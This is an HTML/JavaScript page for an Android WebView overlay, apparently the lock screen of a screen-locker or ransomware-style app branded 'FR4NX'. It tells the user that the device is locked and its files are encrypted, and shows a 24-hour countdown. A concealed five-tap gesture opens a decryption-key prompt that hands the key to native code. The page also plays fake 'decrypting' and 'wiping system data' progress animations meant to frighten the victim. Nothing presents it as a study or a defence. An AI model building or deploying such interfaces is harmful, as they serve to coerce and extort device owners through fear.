<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; user-select: none; }
        body { background: #05030A; color: white; height: 100vh; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        /* Pulsing Red/Neon Warning Background */
        .bg-glow { position: absolute; width: 300px; height: 300px; background: rgba(255, 0, 0, 0.15); border-radius: 50%; filter: blur(50px); animation: pulse 2s infinite; z-index: 0; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 0.5; } 50% { transform: scale(1.5); opacity: 1; } 100% { transform: scale(1); opacity: 0.5; } }

        /* The Top Left Hidden Trigger Area */
        .hidden-trigger { position: absolute; top: 0; left: 0; width: 120px; height: 120px; z-index: 999; opacity: 0; }

        .content { z-index: 1; text-align: center; width: 90%; max-width: 400px; }
        
        .logo { font-size: 24px; font-weight: 900; color: #fff; text-shadow: 0 0 20px #b78aff; margin-bottom: 40px; letter-spacing: 2px; }
        
        .lock-icon { font-size: 80px; color: #ff3333; text-shadow: 0 0 30px #ff3333; margin-bottom: 20px; animation: shake 3s infinite; }
        @keyframes shake { 0%, 100% { transform: rotate(0); } 10%, 30%, 50%, 70%, 90% { transform: rotate(-10deg); } 20%, 40%, 60%, 80% { transform: rotate(10deg); } }
        
        .title { font-size: 28px; font-weight: bold; color: #fff; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
        .subtitle { font-size: 14px; color: #a892c4; margin-bottom: 30px; }
        
        .timer { font-size: 42px; font-weight: 900; color: #ff3333; font-family: monospace; margin-bottom: 40px; text-shadow: 0 0 15px rgba(255, 51, 51, 0.5); }
        
        .status-text { font-size: 16px; font-weight: bold; color: #ff3333; margin-top: 20px; height: 20px; }
        
        /* Progress Bar */
        .progress-container { width: 100%; height: 10px; background: #1a1025; border-radius: 5px; overflow: hidden; display: none; margin-top: 20px; border: 1px solid #331f4d; }
        .progress-bar { width: 0%; height: 100%; background: #ff3333; transition: width 0.1s linear; box-shadow: 0 0 10px #ff3333; }
        .progress-bar.green { background: #00ffcc; box-shadow: 0 0 10px #00ffcc; }

        /* Hidden Auth Panel */
        .auth-panel { display: none; flex-direction: column; margin-top: 20px; }
        .auth-input { width: 100%; padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid #b78aff; border-radius: 10px; color: white; font-size: 16px; text-align: center; letter-spacing: 5px; outline: none; margin-bottom: 15px; }
        .auth-btn { width: 100%; padding: 15px; background: linear-gradient(90deg, #5b21b6, #9333ea); border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: bold; box-shadow: 0 0 15px rgba(147, 51, 234, 0.5); }
    </style>
</head>
<body>
    <!-- Hidden Tap Area -->
    <div class="hidden-trigger" id="hiddenTrigger"></div>

    <div class="bg-glow"></div>

    <div class="content" id="mainContent">
        <div class="logo">FR4NX</div>
        <div class="lock-icon">🔒</div>
        <div class="title">Device Locked</div>
        <div class="subtitle">Your files have been encrypted.</div>
        
        <div class="timer" id="timer">23:59:59</div>
        
        <div class="status-text" id="statusText"></div>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
    </div>

    <div class="content auth-panel" id="authPanel">
        <div class="title" style="font-size: 20px; margin-bottom: 20px;">ENTER DECRYPTION KEY</div>
        <input type="password" class="auth-input" id="passInput" placeholder="******">
        <button class="auth-btn" onclick="submitPass()">VERIFY IDENTITY</button>
    </div>

    <script>
        // 1. Countdown Timer
        let timeLeft = 24 * 60 * 60; 
        setInterval(() => {
            if (timeLeft <= 0) return;
            timeLeft--;
            let h = Math.floor(timeLeft / 3600);
            let m = Math.floor((timeLeft % 3600) / 60);
            let s = timeLeft % 60;
            document.getElementById('timer').innerText = 
                `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }, 1000);

        // 2. The Hidden 5-Tap Gesture
        let taps = 0;
        let lastTap = 0;
        document.getElementById('hiddenTrigger').addEventListener('click', () => {
            const now = Date.now();
            if (now - lastTap > 1000) { taps = 1; } else { taps++; }
            lastTap = now;
            if (taps >= 5) {
                taps = 0;
                document.getElementById('mainContent').style.display = 'none';
                document.getElementById('authPanel').style.display = 'flex';
                document.getElementById('passInput').focus();
            }
        });

        // 3. Submit Passkey to Java
        function submitPass() {
            let pass = document.getElementById('passInput').value.trim();
            document.getElementById('authPanel').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            
            Android.verifyPasskey(pass);
        }

        // 4. Fake Decrypt / Wipe Logic (Called from Java)
        function showDecrypting() {
            document.getElementById('statusText').innerText = "DECRYPTING SYSTEM FILES...";
            document.getElementById('statusText').style.color = "#00ffcc";
            let pb = document.getElementById('progressBar');
            pb.classList.add('green');
            document.getElementById('progressContainer').style.display = 'block';
            
            let progress = 0;
            let int = setInterval(() => {
                progress += 2;
                pb.style.width = progress + "%";
                if (progress >= 100) { clearInterval(int); Android.unlockOverlay(); }
            }, 100);
        }

        function showWiping() {
            document.getElementById('statusText').innerText = "WARNING: WIPING SYSTEM DATA...";
            document.getElementById('statusText').style.color = "#ff3333";
            let pb = document.getElementById('progressBar');
            pb.classList.remove('green');
            document.getElementById('progressContainer').style.display = 'block';
            
            let progress = 0;
            let int = setInterval(() => {
                progress += 4;
                pb.style.width = progress + "%";
                if (progress >= 100) { 
                    clearInterval(int); 
                    document.getElementById('statusText').innerText = ""; 
                    document.getElementById('progressContainer').style.display = 'none';
                    pb.style.width = "0%";
                    document.getElementById('authPanel').style.display = 'flex'; // Show login again
                    document.getElementById('passInput').value = "";
                }
            }, 100);
        }
    </script>
</body>
</html>
